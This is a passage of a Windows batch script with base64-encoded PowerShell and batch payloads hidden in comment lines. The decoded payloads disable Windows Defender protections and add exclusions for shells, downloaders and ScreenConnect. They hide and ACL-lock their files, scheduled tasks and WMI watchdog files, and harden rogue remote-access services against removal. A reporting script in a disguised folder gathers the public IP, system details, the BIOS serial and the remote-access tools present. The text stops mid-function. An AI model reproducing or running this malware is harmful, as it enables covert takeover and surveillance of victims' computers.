::QVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGlt
::ZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlQmVoYXZpb3JNb25pdG9yaW5nIC90IFJF
::R19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
::RVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUg
::UHJvdGVjdGlvbiIgL3YgRGlzYWJsZUlPQVZQcm90ZWN0aW9uIC90IFJFR19EV09S
::RCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xp
::Y2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVj
::dGlvbiIgL3YgRGlzYWJsZVNjcmlwdFNjYW5uaW5nIC90IFJFR19EV09SRCAvZCAx
::IC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRc
::V2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVdEJSIgL3Qg
::UkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRX
::QVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMi
::IC92ICIlV0QyJSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcg
::YWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4
::Y2x1c2lvbnNcUGF0aHMiIC92ICJDOlxXaW5kb3dzXFRlbXAiIC90IFJFR19EV09S
::RCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNy
::b3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVRF
::TVAlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhL
::TE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9u
::c1xQYXRocyIgL3YgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUp
::IiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1c
::U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQ
::YXRocyIgL3YgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIiAv
::dCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09G
::VFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRo
::cyIgL3YgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiIC90
::IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZU
::V0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhz
::IiAvdiAiJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSIgL3Qg
::UkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpmb3IgJSVQIGluIChtc2lleGVj
::LmV4ZSBjdXJsLmV4ZSBjbWQuZXhlIHBvd2Vyc2hlbGwuZXhlIGNlcnR1dGlsLmV4
::ZSBTY3JlZW5Db25uZWN0LkNsaWVudFNlcnZpY2UuZXhlIFNjcmVlbkNvbm5lY3Qu
::V2luZG93c0NsaWVudC5leGUpIGRvICgNCiAgcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
::RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFByb2Nlc3Nl
::cyIgL3YgIiUlUCIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQopDQoN
::ClJFTSAtLS0gRGVmZW5kZXI6IGxpdmUgTXBQcmVmZXJlbmNlIChzdHJvbmdlciB0
::aGFuIHJlZyBhbG9uZSkgLS0tDQpwb3dlcnNoZWxsLmV4ZSAtTm9Qcm9maWxlIC1O
::b25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCBe
::DQogICIkRXJyb3JBY3Rpb25QcmVmZXJlbmNlPSdTaWxlbnRseUNvbnRpbnVlJzsi
::IF4NCiAgIlRyeXtTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlUmVhbHRpbWVNb25p
::dG9yaW5nICR0cnVlOyBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlQmVoYXZpb3JN
::b25pdG9yaW5nICR0cnVlOyBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSU9BVlBy
::b3RlY3Rpb24gJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVTY3JpcHRT
::Y2FubmluZyAkdHJ1ZX1DYXRjaHt9OyIgXg0KICAiJHBhdGhzPUAoJyVXRCUnLCcl
::V0QyJScsJ0M6XFdpbmRvd3NcVGVtcCcsJGVudjpURU1QLCclUEYlXFNjcmVlbkNv
::bm5lY3QgQ2xpZW50ICglS0VFUDElKScsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGll
::bnQgKCVLRUVQMiUpJywnJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
::UDElKScsJyVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSknKTsi
::IF4NCiAgInRyeXskcGF0aHMrPUBoR2V0LUNoaWxkSXRlbSAtUGF0aCAkZW52OlBy
::b2dyYW1GaWxlcyAtRmlsdGVyICdTY3JlZW5Db25uZWN0IENsaWVudConIC1EaXJl
::Y3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9fWNhdGNo
::e307IiBeDQogICJ0cnl7JHBmODY9W0Vudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0
::aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7IGlmKCRwZjg2KXskcGF0aHMrPUBoR2V0LUNo
::aWxkSXRlbSAtUGF0aCAkcGY4NiAtRmlsdGVyICdTY3JlZW5Db25uZWN0IENsaWVu
::dConIC1EaXJlY3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5h
::bWV9KX19Y2F0Y2h7fTsiIF4NCiAgImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNl
::bGVjdC1PYmplY3QgLVVuaXF1ZSkpeyBpZigkcCAtYW5kIChUZXN0LVBhdGggLUxp
::dGVyYWxQYXRoICRwKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGgg
::JHAgLUVBIDAgfSB9OyIgXg0KICAiZm9yZWFjaCgkeCBpbiBAKCdtc2lleGVjLmV4
::ZScsJ2N1cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hlbGwuZXhlJywnY2VydHV0
::aWwuZXhlJywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScsJ1NjcmVl
::bkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2Ug
::LUV4Y2x1c2lvblByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZl
::cmVuY2UgLUV4Y2x1c2lvbkV4dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAt
::RUEgMCIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBvbmx5IFNZU1RFTSArIEFk
::bWluaXN0cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAtLS0NCmNhbGwgOkxvY2tEaXIg
::IiVXRCUiDQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0tLSBoaWRlIHdv
::cmtkaXJzICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVX
::RCUiID5udWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpm
::b3IgJSVGIGluIChvd25fbW9uLmNtZCBvd25fcnVuLmNtZCBldGxfbW9uLmNtZCB0
::Z19yZXBvcnQucHMxIG93bl9saWIucHMxIHBrZy5tc2kgbm90aWZ5LmNmZyBvd25f
::c2VjdXJlLmNtZCBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikgZG8gKA0KICBpZiBl
::eGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwgMj4m
::MQ0KKQ0KaWYgZXhpc3QgIiVXRDIlXGV0bF9tb24uY21kIiBhdHRyaWIgK2ggK3Mg
::IiVXRDIlXGV0bF9tb24uY21kIiA+bnVsIDI+JjENCg0KUkVNIC0tLSBBQ0w6IHNj
::aGVkdWxlZCB0YXNrIFhNTCAoaGFyZGVyIHRvIGRlbGV0ZSB3aXRob3V0IEFkbWlu
::KSAtLS0NCmZvciAlJVQgaW4gKCVUQVNLU19MSVNUJSkgZG8gKA0KICBpZiBleGlz
::dCAiJVRBU0tST09UJVwlJX5UIiAoDQogICAgaWNhY2xzICIlVEFTS1JPT1QlXCUl
::flQiIC9pbmhlcml0YW5jZTpyID5udWwgMj4mMQ0KICAgIGljYWNscyAiJVRBU0tS
::T09UJVwlJX5UIiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZXFNZU1RFTTpGIiAiQlVJ
::TFRJTlxBZG1pbmlzdHJhdG9yczpGIiA+bnVsIDI+JjENCiAgICBhdHRyaWIgK2gg
::K3MgIiVUQVNLUk9PVCVcJSV+VCIgPm51bCAyPiYxDQogICkNCikNCg0KUkVNIC0t
::LSBBQ0w6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIp
::IC0tLQ0KaWNhY2xzICIlU3lzdGVtUm9vdCVcU3lzdGVtMzJcd2JlbVxSZXBvc2l0
::b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxTWVNURU06RiIgPm51bCAyPiYxDQoN
::ClJFTSAtLS0gQUNMOiBrZWVwIFNjcmVlbkNvbm5lY3QgaW5zdGFsbCBkaXJzIChv
::bmNlOyB0YWtlb3duIGV2ZXJ5IHRpY2sgaXMgbm9pc3kpIC0tLQ0KaWYgbm90IGV4
::aXN0ICIlV0QlXHNlY3VyZV9zYy5mbGFnIiAoDQogIGZvciAlJUQgaW4gKA0KICAg
::ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSINCiAgICAiJVBG
::JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICAgIiVQRjg2JVxT
::Y3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiDQogICAgIiVQRjg2JVxTY3Jl
::ZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICkgZG8gKA0KICAgIGlmIGV4
::aXN0ICIlJX5EIiBjYWxsIDpMb2NrRGlyICIlJX5EIg0KICApDQogIGVjaG8gc2Nf
::bG9ja2VkPiVXRCVcc2VjdXJlX3NjLmZsYWcNCikNCg0KUkVNIC0tLSBTQyBzZXJ2
::aWNlczogU1lTVEVNIGNhbiBjb25maWcvc3RvcC9kZWxldGU7IEJBIGZ1bGw7IHVz
::ZXJzIGJsb2NrZWQgLS0tDQpSRU0gU1k6IENDIERDIExDIFNXIFJQIERUIExPIFJD
::ICAobm8gU0QgLT4gY2Fubm90IGNoYW5nZSB0aGlzIFNEIGl0c2VsZikNCnNldCAi
::U0Q9RDooQTs7Q0NEQ0xDU1dSUFdQRFRMT0NSUkM7OztTWSkoQTs7Q0NEQ0xDU1dS
::UFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5leGUgc2RzZXQgIiVQUklNJSIg
::IiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxUJSIgIiVTRCUiID5u
::dWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJVBSSU0lIiBzdGFydD0gYXV0byA+bnVs
::IDI+JjENCnNjLmV4ZSBjb25maWcgIiVBTFQlIiBzdGFydD0gYXV0byA+bnVsIDI+
::JjENCnNjLmV4ZSBmYWlsdXJlICIlUFJJTSUiIHJlc2V0PSA4NjQwMCBhY3Rpb25z
::PSByZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVs
::IDI+JjENCnNjLmV4ZSBmYWlsdXJlICIlQUxUJSIgcmVzZXQ9IDg2NDAwIGFjdGlv
::bnM9IHJlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwID5u
::dWwgMj4mMQ0KDQplY2hvIHNlY3VyZV9kb25lPj4iJUxPRyUNCmV4aXQgL2IgMA0K
::DQo6TG9ja0Rpcg0Kc2V0ICJUPSV+MSINCmlmIG5vdCBleGlzdCAiJVQlIiBleGl0
::IC9iIDANClJFTSB0YWtlIG93bmVyc2hpcCB0aGVuIHN0cmlwIGluaGVyaXRlZCBB
::Q0VzOyBTWVNURU0rQWRtaW5zIG9ubHkNCnRha2Vvd24gL0YgIiVUJSIgL1IgL0Qg
::WSA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvaW5oZXJpdGFuY2U6ciA+bnVsIDI+
::JjENCmljYWNscyAiJVQlIiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZXFNZU1RFTToo
::T0kpKENJKUYiICJCVUlMVElOXEFkbWluaXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51
::bCAyPiYxDQppY2FjbHMgIiVUJSIgL3JlbW92ZTpnICJVc2VycyIgIkF1dGhlbnRp
::Y2F0ZWQgVXNlcnMiICJFdmVyeW9uZSIgIk5UIEFVVEhPUklUWVxJTlRFUkFDVElW
::RSIgIkJVSUxUSU5cVXNlcnMiID5udWwgMj4mMQ0KZXhpdCAvYiAwDQo=
::B64_SEC_END
::B64_TGR_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyBUR19SRVBPUlQgQlVJTEQgMjAyNjA4
::MDJUNyAtIGlkZW50aXR5LWF3YXJlIHRhc2tzICsgY29tcGFjdCBkaWdlc3QgbW9k
::ZQ0KcGFyYW0oDQogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0
::cmluZ10kU3RhdGUsDQogICAgW3N0cmluZ10kU3VtbWFyeSA9ICcnLA0KICAgIFtz
::dHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRv
::d3NcV0VSXFRlbXBcLnd1Y2FjaGUnLA0KICAgIFtzdHJpbmddJE9sZFN0YXRlID0g
::JycsDQogICAgW1ZhbGlkYXRlU2V0KCdyaWNoJywgJ2NvbXBhY3QnKV1bc3RyaW5n
::XSRNb2RlID0gJ3JpY2gnLA0KICAgIFtzdHJpbmddJEJ1aWxkID0gJ08xNScsDQog
::ICAgW3N0cmluZ10kQ291bnQgPSAnMCcNCikNCg0KJEVycm9yQWN0aW9uUHJlZmVy
::ZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJw0KJFByb2dyZXNzUHJlZmVyZW5jZSA9
::ICdTaWxlbnRseUNvbnRpbnVlJw0KdHJ5IHsgW05ldC5TZXJ2aWNlUG9pbnRNYW5h
::Z2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5
::cGVdOjpUbHMxMiB9IGNhdGNoIHt9DQoNCmZ1bmN0aW9uIEdldC1DZmcgew0KICAg
::ICRwYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdub3RpZnkuY2ZnJw0KICAgICRj
::ZmcgPSBAe30NCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRwYXRoKSkgeyByZXR1
::cm4gJGNmZyB9DQogICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwYXRoIHwg
::Rm9yRWFjaC1PYmplY3Qgew0KICAgICAgICBpZiAoJF8gLW1hdGNoICdeXHMqKFtB
::LVphLXowLTlfXSspXHMqPVxzKiguKilccyokJykgew0KICAgICAgICAgICAgJGNm
::Z1skbWF0Y2hlc1sxXV0gPSAkbWF0Y2hlc1syXS5UcmltKCkNCiAgICAgICAgfQ0K
::ICAgIH0NCiAgICByZXR1cm4gJGNmZw0KfQ0KDQpmdW5jdGlvbiBFc2MoW3N0cmlu
::Z10kcykgew0KICAgIGlmICgkbnVsbCAtZXEgJHMpIHsgcmV0dXJuICcnIH0NCiAg
::ICByZXR1cm4gKCRzIC1yZXBsYWNlICcmJywgJyZhbXA7JyAtcmVwbGFjZSAnPCcs
::ICcmbHQ7JyAtcmVwbGFjZSAnPicsICcmZ3Q7JykNCn0NCg0KZnVuY3Rpb24gR2V0
::LVB1YmxpY0lwIHsNCiAgICBmb3JlYWNoICgkdSBpbiBAKA0KICAgICAgICAgICAg
::J2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycsDQogICAgICAgICAgICAnaHR0cHM6Ly9p
::ZmNvbmZpZy5tZS9pcCcsDQogICAgICAgICAgICAnaHR0cHM6Ly9pY2FuaGF6aXAu
::Y29tJw0KICAgICAgICApKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAk
::ciA9IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHUgLVVzZUJhc2ljUGFyc2luZyAt
::VGltZW91dFNlYyA2DQogICAgICAgICAgICAkaXAgPSAoJHIuQ29udGVudCB8IE91
::dC1TdHJpbmcpLlRyaW0oKQ0KICAgICAgICAgICAgaWYgKCRpcCAtbWF0Y2ggJ15c
::ZHsxLDN9KFwuXGR7MSwzfSl7M30kJyAtb3IgJGlwIC1tYXRjaCAnOicpIHsgcmV0
::dXJuICRpcCB9DQogICAgICAgIH0gY2F0Y2gge30NCiAgICB9DQogICAgcmV0dXJu
::ICduL2EnDQp9DQoNCmZ1bmN0aW9uIEdldC1Mb2NhbElwcyB7DQogICAgdHJ5IHsN
::CiAgICAgICAgJGlwcyA9IEdldC1OZXRJUEFkZHJlc3MgLUFkZHJlc3NGYW1pbHkg
::SVB2NCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAg
::ICBXaGVyZS1PYmplY3QgeyAkXy5JUEFkZHJlc3MgLW5vdGxpa2UgJzEyNy4qJyAt
::YW5kICRfLlByZWZpeE9yaWdpbiAtbmUgJ1dlbGxLbm93bicgfSB8DQogICAgICAg
::ICAgICBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBJUEFkZHJlc3MgLVVu
::aXF1ZQ0KICAgICAgICBpZiAoJGlwcykgeyByZXR1cm4gKCRpcHMgLWpvaW4gJywg
::JykgfQ0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkaXBzID0g
::R2V0LUNpbUluc3RhbmNlIFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlv
::biAtRmlsdGVyICdJUEVuYWJsZWQ9VHJ1ZScgfA0KICAgICAgICAgICAgRm9yRWFj
::aC1PYmplY3QgeyAkXy5JUEFkZHJlc3MgfSB8IFdoZXJlLU9iamVjdCB7ICRfIC1h
::bmQgJF8gLW5vdGxpa2UgJzEyNy4qJyAtYW5kICRfIC1ub3RsaWtlICcqOionIH0N
::CiAgICAgICAgaWYgKCRpcHMpIHsgcmV0dXJuICgoJGlwcyB8IFNlbGVjdC1PYmpl
::Y3QgLVVuaXF1ZSkgLWpvaW4gJywgJykgfQ0KICAgIH0gY2F0Y2gge30NCiAgICBy
::ZXR1cm4gJ24vYScNCn0NCg0KZnVuY3Rpb24gR2V0LU9zSW5mbyB7DQogICAgJG8g
::PSBbb3JkZXJlZF1Aew0KICAgICAgICBDYXB0aW9uID0gJ24vYSc7IFZlcnNpb24g
::PSAnbi9hJzsgQnVpbGQgPSAnbi9hJzsgQXJjaCA9ICduL2EnDQogICAgICAgIERv
::bWFpbiA9ICduL2EnOyBJbnN0YWxsRGF0ZSA9ICduL2EnOyBMYXN0Qm9vdCA9ICdu
::L2EnDQogICAgICAgIENQVSA9ICduL2EnOyBNYW51ZmFjdHVyZXIgPSAnbi9hJzsg
::TW9kZWwgPSAnbi9hJzsgU2VyaWFsID0gJ24vYScNCiAgICAgICAgVG90YWxSQU1f
::R0IgPSAnbi9hJzsgRGlza0ZyZWVfR0IgPSAnbi9hJzsgRGlza1NpemVfR0IgPSAn
::bi9hJw0KICAgIH0NCiAgICB0cnkgew0KICAgICAgICAkb3MgPSBHZXQtQ2ltSW5z
::dGFuY2UgV2luMzJfT3BlcmF0aW5nU3lzdGVtDQogICAgICAgICRvLkNhcHRpb24g
::PSAkb3MuQ2FwdGlvbg0KICAgICAgICAkby5WZXJzaW9uID0gJG9zLlZlcnNpb24N
::CiAgICAgICAgJG8uQnVpbGQgPSAkb3MuQnVpbGROdW1iZXINCiAgICAgICAgJG8u
::QXJjaCA9ICRvcy5PU0FyY2hpdGVjdHVyZQ0KICAgICAgICAkby5JbnN0YWxsRGF0
::ZSA9ICgkb3MuSW5zdGFsbERhdGUgfCBHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1N
::LWRkJykNCiAgICAgICAgJG8uTGFzdEJvb3QgPSAoJG9zLkxhc3RCb290VXBUaW1l
::IHwgR2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbScpDQogICAgICAg
::ICRvLlRvdGFsUkFNX0dCID0gW21hdGhdOjpSb3VuZCgkb3MuVG90YWxWaXNpYmxl
::TWVtb3J5U2l6ZSAvIDFNQiwgMSkNCiAgICB9IGNhdGNoIHt9DQogICAgdHJ5IHsN
::CiAgICAgICAgJGNzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0NvbXB1dGVyU3lz
::dGVtDQogICAgICAgICRvLkRvbWFpbiA9IGlmICgkY3MuUGFydE9mRG9tYWluKSB7
::ICRjcy5Eb21haW4gfSBlbHNlIHsgJGNzLldvcmtncm91cCB9DQogICAgICAgICRv
::Lk1hbnVmYWN0dXJlciA9ICRjcy5NYW51ZmFjdHVyZXINCiAgICAgICAgJG8uTW9k
::ZWwgPSAkY3MuTW9kZWwNCiAgICB9IGNhdGNoIHt9DQogICAgdHJ5IHsNCiAgICAg
::ICAgJG8uQ1BVID0gKEdldC1DaWxkSXRlbSAtUGF0aCAkZW52OlByb2dyYW1GaWxl
::cyAtRmlsdGVyICdTY3JlZW5Db25uZWN0IENsaWVudConIC1EaXJlY3RvcnkgLUVB
::IDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9KSkgDQogICAgfSBjYXRj
::aCB7fQ0KICAgIHRyeSB7DQogICAgICAgICRvLlNlcmlhbCA9IChHZXQtQ2ltSW5z
::dGFuY2UgV2luMzJfQklPUykuU2VyaWFsTnVtYmVyDQogICAgfSBjYXRjaCB7fQ0K
::ICAgIHRyeSB7DQogICAgICAgICRkID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0xv
::Z2ljYWxEaXNrIC1GaWx0ZXIgIkRldmljZUlEPSdDOiciDQogICAgICAgICRvLkRp
::c2tGcmVlX0dCID0gW21hdGhdOjpSb3VuZCgkZC5GcmVlU3BhY2UgLyAxR0IsIDEp
::DQogICAgICAgICRvLkRpc2tTaXplX0dCID0gW21hdGhdOjpSb3VuZCgkZC5TaXpl
::IC8gMUdCLCAxKQ0KICAgIH0gY2F0Y2gge30NCiAgICByZXR1cm4gJG8NCn0NCg0K
::ZnVuY3Rpb24gR2V0LVN2Y0xpbmUoW3N0cmluZ10kbmFtZSkgew0KICAgICRzID0g
::R2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJ05PVCBJTlNUQUxMRUQn
::IH0NCiAgICByZXR1cm4gKCd7MH0gKFN0YXJ0PXsxfSknIC1mICRzLlN0YXR1cywg
::JHMuU3RhcnRUeXBlKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtVGFza0hlYWx0aChbc3Ry
::aW5nXSR0bikgew0KICAgICRvdXQgPSAmIHNjaHRhc2tzLmV4ZSAvUXVlcnkgL1RO
::ICR0biAvRk8gTElTVCAvViAyPiRudWxsDQogICAgaWYgKCRMQVNURVhJVENPREUg
::LW5lIDAgLW9yIC1ub3QgJG91dCkgeyByZXR1cm4gQHsgUHJlc2VudCA9ICRmYWxz
::ZTsgU3RhdHVzID0gJ01JU1NJTkcnOyBOZXh0ID0gJyc7IExhc3QgPSAnJzsgUmVz
::dWx0ID0gJycgfSB9DQogICAgJG1hcCA9IEB7fQ0KICAgIGZvcmVhY2ggKCRsaW5l
::IGluICRvdXQpIHsNCiAgICAgICAgaWYgKCRsaW5lIC1tYXRjaCAnXlxzKihbXjpd
::Kyk6XHMqKC4qKVxzKiQnKSB7DQogICAgICAgICAgICAkbWFwWyRtYXRjaGVzWzFd
::LlRyaW0oKV0gPSAkbWF0Y2hlc1syXS5UcmltKCkNCiAgICAgICAgfQ0KICAgIH0N
::CiAgICAkc3RhdHVzID0gJG1hcFsnU3RhdHVzJ10NCiAgICBpZiAoLW5vdCAkc3Rh
::dHVzKSB7ICRzdGF0dXMgPSAkbWFwWydUYXNrIFN0YXR1cyddIH0NCiAgICBpZiAo
::LW5vdCAkc3RhdHVzKSB7ICRzdGF0dXMgPSAncHJlc2VudCcgfQ0KICAgICRuZXh0
::ID0gJG1hcFsnTmV4dCBSdW4gVGltZSddDQogICAgaWYgKC1ub3QgJG5leHQpIHsg
::JG5leHQgPSAnJyB9DQogICAgJGxhc3QgPSAkbWFwWydMYXN0IFJ1biBUaW1lJ10N
::CiAgICBpZiAoLW5vdCAkbGFzdCkgeyAkbGFzdCA9ICcnIH0NCiAgICAkcmVzdWx0
::ID0gJG1hcFsnTGFzdCBSZXN1bHQnXQ0KICAgIGlmICgtbm90ICRyZXN1bHQpIHsg
::JHJlc3VsdCA9ICcnIH0NCiAgICAkaGVhbHRoeSA9ICgkc3RhdHVzIC1tYXRjaCAn
::UmVhZHl8UnVubmluZycpIC1vciAoJHN0YXR1cyAtZXEgJ3ByZXNlbnQnKQ0KICAg
::IHJldHVybiBAew0KICAgICAgICBQcmVzZW50ID0gJHRydWUNCiAgICAgICAgSGVh
::bHRoeSA9IFtib29sXSRoZWFsdGh5DQogICAgICAgIFN0YXR1cyAgPSAkc3RhdHVz
::DQogICAgICAgIE5leHQgICAgPSAkbmV4dA0KICAgICAgICBMYXN0ICAgID0gJGxh
::c3QNCiAgICAgICAgUmVzdWx0ICA9ICRyZXN1bHQNCiAgICB9DQp9DQoNCmZ1bmN0
::aW9uIEdldC1SbW1IaXRzIHsNCiAgICAkdG9rZW5zID0gQCgNCiAgICAgICAgJ0Fu
::eURlc2snLCAnVGVhbVZpZXdlcicsICd0dm5zZXJ2ZXInLCAnRFdBZ2VudCcsICdE
::V1NlcnZpY2UnLCAnTG9nTWVJbicsICdMTUlHdWFyZGlhbicsDQogICAgICAgICdX
::aW5WTkMnLCAndm5jc2VydmVyJywgJ3R2XycsICdTcGxhc2h0b3AnLCAnWm9obycs
::ICdSdXN0RGVzaycsICdSZW1vdGVQQycsICdEYW1lV2FyZScsDQogICAgICAgICdB
::dGVyYUFnZW50JywgJ0F0ZXJhJywgJ05pbmphUk1NJywgJ05pbmphT25lJywgJ05p
::bmphJywgJ0thc2V5YScsICdQdWxzZXdheScsICdTeW5jcm8nLA0KICAgICAgICAn
::U3VwZXJPcHMnLCAnTWFuYWdlRW5naW5lJywgJ1NvbGFyV2luZHMnLCAnQ29ubmVj
::dFdpc2UnLCAnTFRTZXJ2aWNlJywgJ0xhYlRlY2gnLA0KICAgICAgICAnQWN0aW9u
::MScsICdTaW1wbGVIZWxwJywgJ0JvbWdhcicsICdCZXlvbmRUcnVzdCcsICdNZXNo
::QWdlbnQnLCAnTWVzaCBDZW50cmFsJywNCiAgICAgICAgJ1RhY3RpY2FsUk1NJywg
::J3RhY3RpY2Fscm1tJywgICAgICAgICAnR2V0U2NyZWVuJywgJ1N1cHJlbW8nLCAn
::cnV0c2VydicsICdyZW1vdGluZ19ob3N0JywNCiAgICAgICAgJ0Nocm9tZSBSZW1v
::dGUgRGVza3RvcCcsICdQYXJzZWMnLCAnTmV0U3VwcG9ydCcsICdMZXZlbC5pbycs
::ICdMZXZlbCBBZ2VudCcsDQogICAgICAgICdEYXR0byBSTU0nLCAnQ29udGludXVt
::Jw0KICAgICkNCiAgICAkaGl0cyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rp
::b25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAgJHNlZW4gPSBAe30NCg0KICAg
::IGZ1bmN0aW9uIEFkZC1IaXQoW3N0cmluZ10ka2luZCwgW3N0cmluZ10kbmFtZSkg
